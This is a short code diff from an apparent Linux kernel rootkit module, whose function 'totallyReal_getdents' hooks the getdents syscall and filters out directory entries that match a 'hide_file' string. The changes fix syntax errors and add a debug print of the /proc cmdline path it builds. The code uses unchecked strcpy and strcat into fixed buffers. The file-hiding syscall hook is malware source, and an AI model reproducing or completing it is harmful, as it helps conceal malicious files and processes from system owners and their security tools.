@@ -97,17 +97,17 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 		unsigned short p_dirent_len = p_dirp->d_reclen;
 		
 		struct file *f;
-		char buf[128[;
+		char buf[128];
 		mm_segment_t fs;
 		int i = 0;
-		for (i = 0; i < 128, i++)
+		for (i = 0; i < 128; i++)
 			buf[i] = 0;
 		char filename[128];
 		strcpy( filename, buf );
 		strcat( filename, "/proc/" );
 		strcat( filename, p_dirp->d_name);
 		strcat( filename, "/cmdline" );
-		
+		pr_info("FAKEGETDENTS: filename is: %s", filename);
 
 		if (strstr(p_dirp->d_name, hide_file) != NULL ) {
 			if (p_dirp == mod_dirp) {
